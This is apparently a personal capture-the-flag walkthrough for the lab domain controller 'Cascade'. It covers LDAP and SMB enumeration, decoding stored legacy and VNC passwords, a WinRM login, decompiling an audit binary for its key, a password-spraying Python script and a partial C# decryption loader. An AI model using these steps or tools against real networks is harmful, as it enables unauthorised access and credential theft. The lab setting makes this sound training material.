```
Host is up (0.026s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-25 00:00:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-25T00:01:07
|_  start_date: 2025-09-24T23:51:08
|_clock-skew: -1s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
```

no webserver as far as i can tell, ill check the basics, ldap, smb, rpc, 
```
ldapsearch -x -H ldap://10.10.10.182 -s base -LLL
```
```
dn:
currentTime: 20250925001250.0Z
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=cascade,DC=local
dsServiceName: CN=NTDS Settings,CN=CASC-DC1,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local
defaultNamingContext: DC=cascade,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=cascade,DC=local
configurationNamingContext: CN=Configuration,DC=cascade,DC=local
rootDomainNamingContext: DC=cascade,DC=local
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
highestCommittedUSN: 340156
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
dnsHostName: CASC-DC1.cascade.local
ldapServiceName: cascade.local:casc-dc1$@CASCADE.LOCAL
serverName: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Conf
 iguration,DC=cascade,DC=local
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
isSynchronized: TRUE
isGlobalCatalogReady: TRUE
domainFunctionality: 4
forestFunctionality: 4
domainControllerFunctionality: 4
```
i see:
```
CASC-DC1.cascade.local -> DC
cascade.local -> Domain
```
- **Domain name (the AD forest root)**
    
    `defaultNamingContext: DC=cascade,DC=local`
    
    → The Active Directory domain is **cascade.local**.
    
- **Domain controller hostname**
    
    `dnsHostName: CASC-DC1.cascade.local`
    
    → The DC’s FQDN is **CASC-DC1.cascade.local**.  
    The short hostname is **CASC-DC1**.
    
- **Confirmation that it’s a DC**
    
    `dsServiceName: CN=NTDS Settings,CN=CASC-DC1,CN=Servers, ... domainControllerFunctionality: 4`
    
    → NTDS Settings object and functionality values confirm this is an AD Domain Controller.
    
- **Service principal name for LDAP**
    
    `ldapServiceName: cascade.local:casc-dc1$@CASCADE.LOCAL`
    
    → Ties the domain (cascade.local) to the DC machine account (casc-dc1$).
lets try:
```
ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" -LLL \ 
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName | \
  awk '/^sAMAccountName: /{print $2}' > users.txt
```
```
cat users.txt       
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

alright! we now have a list of users! we can def use this later....
```
ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" "(objectCategory=group)" cn member -LLL
```
```
dn: CN=Group Policy Creator Owners,CN=Users,DC=cascade,DC=local
cn: Group Policy Creator Owners
member: CN=Administrator,CN=Users,DC=cascade,DC=local
...
dn: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
cn: Remote Management Users
member: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
member: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
...
dn: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local
cn: Audit Share
member: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
```

with this info i would bet good money our target is going to be s.smith aka steve smith lol
lets run this for each user:
```
ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" \
  "(sAMAccountName=<username from users.txt>)" distinguishedName cn displayName sAMAccountName -LLL
```
```
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```
Could have also found the field cascaseLegacyPwd and ran below but ultimately have to run the above foreach user:
```
ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" \
  "(&(objectCategory=person)(sAMAccountName=<user>))" cascadeLegacyPwd -LLL
  
  or easier way:
  ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" "(cascadeLegacyPwd=*)" cascadeLegacyPwd sAMAccountName -LLL
```
```
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
cascadeLegacyPwd: clk0bjVldmE=
```
BUT moving on....

this looks to be base64 encoded:
```
echo 'clk0bjVldmE=' | base64 --decode                                         
rY4n5eva
```

creds:
```
r.thompson:rY4n5eva
```
we can keep chopping away at ldap but i want to check smb:
```
smbmap -H 10.10.10.182
```
no access... but with newly found creds:

```
smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
```
```
 IP: 10.10.10.182:445	Name: 10.10.10.182        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	Audit$                                            	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	Data                                              	READ ONLY	
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	print$                                            	READ ONLY	Printer Drivers
	SYSVOL                                            	READ ONLY	Logon server share 
```
lovely!
Data seems legit, lets take a peek

```
smbclient -N //10.10.10.182/Data -U 'r.thompson' --password 'rY4n5eva'
```
inside:
```
 Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020
```

i only have permissions to read IT:
```
  Email Archives                      D        0  Tue Jan 28 13:00:30 2020
  LogonAudit                          D        0  Tue Jan 28 13:04:40 2020
  Logs                                D        0  Tue Jan 28 19:53:04 2020
  Temp                                D        0  Tue Jan 28 17:06:59 2020
```

inside Email Archives i found this html file:
```
We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). 
```

pretty interesting... if we find this then bang! Lets keep digging...
```
inside of Temp there is s.smith dir and in there:
cat VNC\ Install.reg            
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```
`password=hex:6b,cf,2a,4b,6e,5a,ca,0f`
HUH?

Lets look up this...

looks like we can use a tool called xxd:
```
echo "6b,cf,2a,4b,6e,5a,ca,0f" | xxd -p -r
k�*KnZ�                                
```

hmmm lets remove the `,` ???

```
echo "6bcf2a4b6e5aca0f" | xxd -p -r                               
k�*KnZ� 
```
same output...

welp i bet the characters that are there are correct but something going on with the others that arent so straight forward...

found another tool, hurl:
```
apt install hurl
```

hURL did not work lol 

Now i found this:

- Copy the sequence of hexadecimal numbers that comes after the `hex:` prefix.
- Remove all commas and spaces.
- For the example above, you would copy `D7A514D8C556AADE`.
  and run this:

```
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```
sT333ve2 is pass! wooooo

creds:
```
s.smith: sT333ve2
```

```
evil-winrm -i 10.10.10.182 -u s.smith -p 'sT333ve2'
```

```
*Evil-WinRM* PS C:\Users\s.smith\Desktop> cat user.txt
92516972738cfcc356560255b129553d
```

User PWN!

---

### Priv Esc

```
upload winPEASx64.exe
```

i find a few cool things in here:
```
current user: s.smith
  Current groups: Domain Users, Everyone, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, Data Share, Audit Share, IT, Remote Management Users, NTLM Authentication
```

```
 SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
```

Program Files:
```
d-----         1/9/2020   3:12 PM                Common Files
d-----         3/3/2020  12:19 PM                Internet Explorer
d-----         1/9/2020   3:28 PM                MSBuild
d-----         1/9/2020   3:28 PM                Reference Assemblies
d-----         1/9/2020   3:12 PM                VMware
d-----        1/13/2020   3:06 AM                Windows Mail
d-----        7/14/2009   6:37 AM                Windows NT
d-----        1/13/2020   3:19 AM                WindowsPowerShell
```

SeIncreaseWorkingSetPrivilege seems promising.... i going to look in these programs and really see what they are if there is any low hanging fruit

also found:
```
net user s.smith /domain
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

MapAuditDrive.vbs runs when s.smith logons

```
type \\CASC-DC1\SYSVOL\cascade.local\scripts\MapAuditDrive.vbs
```
```
'MapAuditDrive.vbs
Option Explicit
Dim oNetwork, strDriveLetter, strRemotePath
strDriveLetter = "F:"
strRemotePath = "\\CASC-DC1\Audit$"
Set oNetwork = CreateObject("WScript.Network")
oNetwork.MapNetworkDrive strDriveLetter, strRemotePath
WScript.Quit
```

from above we know we dont have permissions before as thompson...

```
smbclient -N //10.10.10.182/Audit$ -U 's.smith' --password 'sT333ve2'
```
```
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020
```

a lot here!

inside /DB
```
Get file Audit.db? y
```

i look in and looks like i might need to decrypt?? im not sure i will look at the other files here and google...

another interesting file is:
```
Get file CascAudit.exe? y
```

```
FROM LDAP
DomainPwd!c4scadek3y6543217Error decrypting password: eError getting LDAP connection data From database: \K(&(isDeletFound 1 results from LDAP query��INSERT INTO DeletedUserAudit (Name,Username,DistinguishedName) VALUES (@Name,@Username,@Dn)
```

`DomainPwd!c4scadek3y6543217`

though i try that with crackmapexec ldap:
MY crackmapexec does not work for ldap so i wrote script:
```python
#!/usr/bin/env python3
"""
ldapCheck.py

Small utility to test LDAP binds similar to CrackMapExec's ldap mode.

Usage examples:
  Single password, user file:
    ./cme_ldap_like.py -u users.txt -p 'Password123!' -d CASCADE 10.10.10.182

  Password file:
    ./cme_ldap_like.py -u users.txt -p pwfile.txt -d CASCADE 10.10.10.182

  Single user, multiple passwords:
    ./cme_ldap_like.py -u s.smith -p pass1 -p pass2 -d CASCADE 10.10.10.182

Options:
  -u USERNAME|FILE  Username(s) or file(s) with usernames (one per line). Can be repeated.
  -p PASSWORD|FILE  Password(s) or file(s) with passwords (one per line). Can be repeated.
  -d DOMAIN         Domain short name (required)
  target            Target LDAP host/IP (required)
  --delay FLOAT     Delay between attempts in seconds (default 1.0)
  --timeout INT     Connection bind timeout seconds (default 8)
  --out FILE        Output file for valid creds (default valid_creds.txt)
  --continue-on-success
                    If set, continue testing other passwords for same user after a success.
  --verbose         Verbose logging
"""
import argparse
import subprocess
import sys
import time
from pathlib import Path

def read_list_args(args_list):
    """
    Given a list of strings that may be filenames or literals,
    return a flat list of entries. If an entry is a readable file,
    read lines (strip) and return its contents; otherwise return the entry itself.
    """
    out = []
    for item in args_list or []:
        p = Path(item)
        if p.exists() and p.is_file():
            for line in p.read_text(encoding='latin-1', errors='ignore').splitlines():
                v = line.strip()
                if v:
                    out.append(v)
        else:
            out.append(item)
    return out

def try_ldap3_bind(host, domain, bind_user, password, timeout):
    """
    Try to bind using ldap3 with given bind_user and password.
    Returns True on success, False on failure (and error string).
    """
    try:
        from ldap3 import Server, Connection, ALL
    except Exception as e:
        return False, f"ldap3-missing:{e}"

    server = Server(host, get_info=ALL, connect_timeout=timeout)
    try:
        conn = Connection(server, user=bind_user, password=password, auto_bind=True, receive_timeout=timeout)
        conn.unbind()
        return True, None
    except Exception as e:
        return False, str(e)

def try_ldapwhoami_bind(host, bind_user, password, timeout):
    """
    Fallback to ldapwhoami binary. Returns True on success, False on failure.
    """
    cmd = ["ldapwhoami", "-x", "-H", f"ldap://{host}", "-D", bind_user, "-w", password]
    try:
        r = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout)
        return r.returncode == 0, None
    except Exception as e:
        return False, str(e)

def main():
    ap = argparse.ArgumentParser(description="LDAP batch binder (CME-like interface).")
    ap.add_argument("-u", "--username", action="append", required=True, help="Username or file with usernames (one per line). Can be repeated.")
    ap.add_argument("-p", "--password", action="append", required=True, help="Password or file with passwords (one per line). Can be repeated.")
    ap.add_argument("-d", "--domain", required=True, help="Domain short name (e.g. CASCADE)")
    ap.add_argument("target", help="Target LDAP host or IP")
    ap.add_argument("--delay", type=float, default=1.0, help="Delay between attempts (seconds). Default 1.0")
    ap.add_argument("--timeout", type=int, default=8, help="Connection timeout (seconds). Default 8")
    ap.add_argument("--out", default="valid_creds.txt", help="Output file for valid creds")
    ap.add_argument("--continue-on-success", action="store_true", help="Continue trying other passwords for same user after a success")
    ap.add_argument("--verbose", action="store_true", help="Verbose output")
    args = ap.parse_args()

    # Expand username and password inputs (files or literals)
    usernames = read_list_args(args.username)
    passwords = read_list_args(args.password)

    if not usernames:
        print("No usernames found after processing -u args.", file=sys.stderr)
        sys.exit(2)
    if not passwords:
        print("No passwords found after processing -p args.", file=sys.stderr)
        sys.exit(2)

    # Detect ldap3 availability
    use_ldap3 = True
    try:
        import ldap3  # noqa: F401
    except Exception:
        use_ldap3 = False
        if args.verbose:
            print("[*] ldap3 not available; falling back to ldapwhoami.", file=sys.stderr)

    successes = []
    domain = args.domain
    host = args.target

    for user in usernames:
        user = user.strip()
        if not user:
            continue
        if args.verbose:
            print(f"[*] user: {user}", file=sys.stderr)

        user_succeeded = False
        for pw in passwords:
            if args.verbose:
                print(f"    trying password: {pw}", file=sys.stderr)
            # Try two bind styles: DOMAIN\user and user@domain (UPN)
            binds = [f"{domain}\\{user}", f"{user}@{domain.lower()}"]

            for bind_user in binds:
                if use_ldap3:
                    ok, err = try_ldap3_bind(host, domain, bind_user, pw, timeout=args.timeout)
                    if ok:
                        print(f"[+] VALID: {bind_user}:{pw}")
                        successes.append((bind_user, pw))
                        with open(args.out, "a") as fh:
                            fh.write(f"{bind_user}:{pw}\n")
                        user_succeeded = True
                        break
                    else:
                        if args.verbose:
                            print(f"    ldap3 failed for {bind_user}: {err}", file=sys.stderr)
                        # if ldap3 reports it's missing, switch fallback
                        if isinstance(err, str) and err.startswith("ldap3-missing"):
                            use_ldap3 = False
                            if args.verbose:
                                print("[*] switching to ldapwhoami fallback", file=sys.stderr)
                            # fall through to ldapwhoami for this bind_user
                # fallback to ldapwhoami
                if not use_ldap3:
                    ok, err = try_ldapwhoami_bind(host, bind_user, pw, timeout=args.timeout)
                    if ok:
                        print(f"[+] VALID: {bind_user}:{pw}")
                        successes.append((bind_user, pw))
                        with open(args.out, "a") as fh:
                            fh.write(f"{bind_user}:{pw}\n")
                        user_succeeded = True
                        break
                    else:
                        if args.verbose:
                            print(f"    ldapwhoami failed for {bind_user}: {err}", file=sys.stderr)
            if user_succeeded and not args.continue_on_success:
                break
            time.sleep(args.delay)

    if successes:
        print(f"\n[+] Completed: valid creds written to {args.out}")
        for b, p in successes:
            print(f"    {b}:{p}")
    else:
        print("\n[-] No valid creds found.")

if __name__ == "__main__":
    main()

```

```
python3 ldapCheck.py -u users.txt -p 'DomainPwd!c4scadek3y6543217' -d CASCADE 10.10.10.182 

[-] No valid creds found.

```

well lmfao, lets move on...

i think we can use a tool to decrypt that CascAudit.exe:
```
AvaloniaILSpy
```

once i am in i find this code(its a lot feel free to scroll past):
```C#


// CascAudiot.MainModule
using System;
using System.Collections;
using System.Data.SQLite;
using System.DirectoryServices;
using CascAudiot.My;
using CascCrypto;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;

[STAThread]
public static void Main()
{
	//IL_003c: Unknown result type (might be due to invalid IL or missing references)
	//IL_0042: Expected O, but got Unknown
	//IL_0060: Unknown result type (might be due to invalid IL or missing references)
	//IL_0067: Expected O, but got Unknown
	//IL_0135: Unknown result type (might be due to invalid IL or missing references)
	//IL_013c: Expected O, but got Unknown
	//IL_0161: Unknown result type (might be due to invalid IL or missing references)
	//IL_0168: Expected O, but got Unknown
	//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
	//IL_01fd: Expected O, but got Unknown
	//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
	//IL_02b2: Expected O, but got Unknown
	if (((ConsoleApplicationBase)MyProject.Application).get_CommandLineArgs().Count != 1)
	{
		Console.WriteLine("Invalid number of command line args specified. Must specify database path only");
		return;
	}
	SQLiteConnection val = new SQLiteConnection("Data Source=" + ((ConsoleApplicationBase)MyProject.Application).get_CommandLineArgs()[0] + ";Version=3;");
	try
	{
		string text = string.Empty;
		string password = string.Empty;
		string text2 = string.Empty;
		try
		{
			val.Open();
			SQLiteCommand val2 = new SQLiteCommand("SELECT * FROM LDAP", val);
			try
			{
				SQLiteDataReader val3 = val2.ExecuteReader();
				try
				{
					val3.Read();
					text = Conversions.ToString(val3.get_Item("Uname"));
					text2 = Conversions.ToString(val3.get_Item("Domain"));
					string text3 = Conversions.ToString(val3.get_Item("Pwd"));
					try
					{
						password = Crypto.DecryptString(text3, "c4scadek3y654321");
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						Console.WriteLine("Error decrypting password: " + ex2.Message);
						ProjectData.ClearProjectError();
						return;
					}
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			val.Close();
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			Console.WriteLine("Error getting LDAP connection data From database: " + ex4.Message);
			ProjectData.ClearProjectError();
			return;
		}
		int num = 0;
		DirectoryEntry val4 = new DirectoryEntry();
		try
		{
			val4.set_Username(text2 + "\\" + text);
			val4.set_Password(password);
			val4.set_AuthenticationType((AuthenticationTypes)1);
			DirectorySearcher val5 = new DirectorySearcher(val4);
			try
			{
				val5.set_Tombstone(true);
				val5.set_PageSize(1000);
				val5.set_Filter("(&(isDeleted=TRUE)(objectclass=user))");
				val5.get_PropertiesToLoad().AddRange(new string[3] { "cn", "sAMAccountName", "distinguishedName" });
				SearchResultCollection val6 = val5.FindAll();
				try
				{
					Console.WriteLine("Found " + Conversions.ToString(val6.get_Count()) + " results from LDAP query");
					val.Open();
					try
					{
						IEnumerator enumerator = default(IEnumerator);
						try
						{
							enumerator = val6.GetEnumerator();
							while (enumerator.MoveNext())
							{
								SearchResult val7 = (SearchResult)enumerator.Current;
								string text4 = string.Empty;
								string text5 = string.Empty;
								string text6 = string.Empty;
								if (val7.get_Properties().Contains("cn"))
								{
									text4 = Conversions.ToString(val7.get_Properties().get_Item("cn").get_Item(0));
								}
								if (val7.get_Properties().Contains("sAMAccountName"))
								{
									text5 = Conversions.ToString(val7.get_Properties().get_Item("sAMAccountName").get_Item(0));
								}
								if (val7.get_Properties().Contains("distinguishedName"))
								{
									text6 = Conversions.ToString(val7.get_Properties().get_Item("distinguishedName").get_Item(0));
								}
								SQLiteCommand val8 = new SQLiteCommand("INSERT INTO DeletedUserAudit (Name,Username,DistinguishedName) VALUES (@Name,@Username,@Dn)", val);
								try
								{
									val8.get_Parameters().AddWithValue("@Name", (object)text4);
									val8.get_Parameters().AddWithValue("@Username", (object)text5);
									val8.get_Parameters().AddWithValue("@Dn", (object)text6);
									num = checked(num + val8.ExecuteNonQuery());
								}
								finally
								{
									((IDisposable)val8)?.Dispose();
								}
							}
						}
						finally
						{
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
					finally
					{
						val.Close();
						Console.WriteLine("Successfully inserted " + Conversions.ToString(num) + " row(s) into database");
					}
				}
				finally
				{
					((IDisposable)val6)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val5)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val4)?.Dispose();
		}
	}
	finally
	{
		((IDisposable)val)?.Dispose();
	}
}
```

there is this line in there:
```C#
password = Crypto.DecryptString(text3, "c4scadek3y654321");
```

since i dont have a windows vm handy where i can just run this code and print the password...:
```C#
// call_decrypt3.cs - robust loader that loads referenced DLLs in target folder
using System;
using System.IO;
using System.Reflection;
using System.Collections.Generic;

class CallDecrypt3 {
    static void Main(string[] args) {
        if (args.Length < 3) {
            Console.WriteLine("Usage: call_decrypt3.exe <assembly-path> <ciphertext> <key>");
            return;
        }

        string asmPath = args[0];
        string cipher = args[1];
        string key = args[2];

        if (!File.Exists(asmPath)) {
            Console.WriteLine("Assembly not found: " + asmPath);
            return;
        }

        string asmDir = Path.GetDirectoryName(Path.GetFullPath(asmPath));
        AppDomain.CurrentDomain.AssemblyResolve += delegate(object sender, ResolveEventArgs ev) {
            try {
                var an = new AssemblyName(ev.Name).Name;
                string candidate = Path.Combine(asmDir, an + ".dll");
                if (File.Exists(candidate)) return Assembly.LoadFrom(candidate);
            } catch {}
            return null;
        };

        // Load primary assembly
        Assembly primaryAsm = null;
        try {
            primaryAsm = Assembly.LoadFrom(asmPath);
        } catch (Exception ex) {
            Console.WriteLine("Failed to load assembly: " + ex.Message);
            return;
        }
        Console.WriteLine("Loaded primary assembly: " + primaryAsm.FullName);

        // Load all other dll/exe files in same folder (except the primary assembly file)
        List<Assembly> loaded = new List<Assembly>();
        loaded.Add(primaryAsm);
        foreach (string f in Directory.GetFiles(asmDir, "*.dll")) {
            try {
                if (String.Equals(Path.GetFullPath(f), Path.GetFullPath(asmPath), StringComparison.OrdinalIgnoreCase)) continue;
                // skip if already loaded
                bool already = false;
                foreach (var a in loaded) if (String.Equals(Path.GetFullPath(a.Location), Path.GetFullPath(f), StringComparison.OrdinalIgnoreCase)) already = true;
                if (already) continue;
                Assembly a2 = Assembly.LoadFrom(f);
                loaded.Add(a2);
                Console.WriteLine("Loaded dependency: " + a2.FullName + "  (" + Path.GetFileName(f) + ")");
            } catch (Exception ex) {
                // ignore anything that fails to load
                Console.WriteLine("Could not load " + f + ": " + ex.Message);
            }
        }
        // also try .exe in the folder (rare)
        foreach (string f in Directory.GetFiles(asmDir, "*.exe")) {
            try {
                if (String.Equals(Path.GetFullPath(f), Path.GetFullPath(asmPath), StringComparison.OrdinalIgnoreCase)) continue;
